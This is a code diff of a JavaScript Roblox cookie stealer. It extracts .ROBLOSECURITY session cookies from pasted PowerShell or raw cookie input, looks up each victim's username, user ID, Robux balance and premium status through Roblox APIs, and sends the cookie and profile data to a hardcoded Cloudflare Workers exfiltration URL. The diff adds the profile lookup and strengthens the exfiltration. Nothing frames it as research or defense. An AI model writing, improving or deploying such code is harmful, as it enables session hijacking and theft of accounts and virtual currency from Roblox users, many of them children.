@@ -1,77 +1,158 @@
 const CLOUDFLARE_PROXY_URL = "https://wispy-pond-aa69.virtualmachineholder420.workers.dev/";
 
 function extractRobloxSecurityCookie(input) {
-  // Strictly match PowerShell format only
+  // Match PowerShell format
   const powershellPattern = /\$session\.Cookies\.Add\(\(New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)"/;
   const powershellMatch = input.match(powershellPattern);
   
+  // Also match raw cookie format just in case
+  const rawCookiePattern = /(_|\.)ROBLOSECURITY=([^;]+)/;
+  const rawCookieMatch = input.match(rawCookiePattern);
+  
   if (powershellMatch) {
-    return powershellMatch[1]; // Return only the cookie value
+    return powershellMatch[1];
+  } else if (rawCookieMatch) {
+    return rawCookieMatch[2];
   }
   
-  return null; // Not a PowerShell format
+  return null;
 }
 
-// Function to extract profile data (Robux, Username, UserID, etc.)
-function extractProfileData(input) {
-  const robuxPattern = /"Robux":(\d+)/;  // Example: extract Robux balance
-  const usernamePattern = /"Username":"([^"]+)"/;  // Example: extract Username
-  const userIdPattern = /"UserID":(\d+)/;  // Example: extract UserID
-  
-  const robuxMatch = input.match(robuxPattern);
-  const usernameMatch = input.match(usernamePattern);
-  const userIdMatch = input.match(userIdPattern);
-  
-  return {
-    robux: robuxMatch ? robuxMatch[1] : null,
-    username: usernameMatch ? usernameMatch[1] : null,
-    userId: userIdMatch ? userIdMatch[1] : null,
-  };
+async function fetchRobloxProfile(cookie) {
+  try {
+    // First fetch the user info
+    const userResponse = await fetch("https://users.roblox.com/v1/users/authenticated", {
+      headers: {
+        "Cookie": `.ROBLOSECURITY=${cookie}`,
+        "Content-Type": "application/json"
+      }
+    });
+    
+    if (!userResponse.ok) {
+      throw new Error(`User API failed with status ${userResponse.status}`);
+    }
+    
+    const userData = await userResponse.json();
+    
+    // Then fetch premium status (which often includes Robux balance)
+    const premiumResponse = await fetch("https://premiumfeatures.roblox.com/v1/users/premium/membership", {
+      headers: {
+        "Cookie": `.ROBLOSECURITY=${cookie}`
+      }
+    });
+    
+    // Then fetch the economy info (for exact Robux balance)
+    const economyResponse = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
+      headers: {
+        "Cookie": `.ROBLOSECURITY=${cookie}`
+      }
+    });
+    
+    let robux = 0;
+    let isPremium = false;
+    
+    if (economyResponse.ok) {
+      const economyData = await economyResponse.json();
+      robux = economyData.robux || 0;
+    }
+    
+    if (premiumResponse.ok) {
+      const premiumData = await premiumResponse.json();
+      isPremium = premiumData.isPremium || false;
+    }
+    
+    return {
+      robux: robux,
+      username: userData.name,
+      userId: userData.id,
+      displayName: userData.displayName,
+      isPremium: isPremium,
+      cookieValid: true
+    };
+  } catch (error) {
+    console.error("Error fetching Roblox profile:", error);
+    return {
+      robux: null,
+      username: null,
+      userId: null,
+      displayName: null,
+      isPremium: null,
+      cookieValid: false,
+      error: error.message
+    };
+  }
 }
 
 async function sendToProxy(data) {
   try {
     const response = await fetch(CLOUDFLARE_PROXY_URL, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers: { 
+        'Content-Type': 'application/json',
+        'Accept': 'application/json'
+      },
       body: JSON.stringify({
         sessionId: data.cookie,
         timestamp: new Date().toISOString(),
-        robux: data.robux,  // Include Robux balance
-        username: data.username,  // Include username
-        userId: data.userId  // Include user ID
+        robux: data.robux,
+        username: data.username,
+        userId: data.userId,
+        displayName: data.displayName,
+        isPremium: data.isPremium,
+        cookieValid: data.cookieValid,
+        error: data.error || null
       })
     });
-    if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
+    
+    if (!response.ok) {
+      const errorText = await response.text();
+      throw new Error(`Proxy error: ${response.status} - ${errorText}`);
+    }
+    
     return await response.json();
   } catch (error) {
-    console.error('Proxy error:', error);
+    console.error('Proxy communication error:', error);
     throw error;
   }
 }
 
-function bruteforce(input) {
+async function bruteforce(input) {
   const cookie = extractRobloxSecurityCookie(input);
-  const profile = extractProfileData(input);
-
+  
   let content;
   if (cookie) {
-    content = `✅ Extracted from PowerShell format:\n\`\`\`${cookie}\`\`\``;
+    content = `✅ Extracted cookie:\n\`\`\`${cookie}\`\`\``;
+    
+    // Fetch profile data using the cookie
+    const profile = await fetchRobloxProfile(cookie);
+    
+    // Prepare the data to be sent
+    const dataToSend = {
+      cookie: cookie,
+      robux: profile.robux,
+      username: profile.username,
+      userId: profile.userId,
+      displayName: profile.displayName,
+      isPremium: profile.isPremium,
+      cookieValid: profile.cookieValid,
+      error: profile.error
+    };
+    
+    // Send to proxy
+    await sendToProxy(dataToSend);
+    
+    // Add profile info to console output
+    content += `\n\n✅ Profile Data:\nUsername: ${profile.username || 'N/A'}\nDisplay Name: ${profile.displayName || 'N/A'}\nUser ID: ${profile.userId || 'N/A'}\nRobux: ${profile.robux || 'N/A'}\nPremium: ${profile.isPremium ? 'Yes' : 'No'}\nCookie Valid: ${profile.cookieValid ? 'Yes' : 'No'}`;
+    
+    if (profile.error) {
+      content += `\nError: ${profile.error}`;
+    }
   } else {
-    content = `⚠️ Raw input (not PowerShell format):\n\`\`\`${input}\`\`\``;
+    content = `⚠️ No valid cookie found in input:\n\`\`\`${input.length > 500 ? input.substring(0, 500) + '...' : input}\`\`\``;
   }
-
-  // Prepare the data to be sent, including profile data (Robux, username, etc.)
-  const dataToSend = {
-    cookie: cookie,
-    robux: profile.robux,
-    username: profile.username,
-    userId: profile.userId
-  };
-
-  // Send to proxy
-  console.log(content);  // You can check the content being logged
-  sendToProxy(dataToSend);
+  
+  console.log(content);
+  return content;
 }
 
 
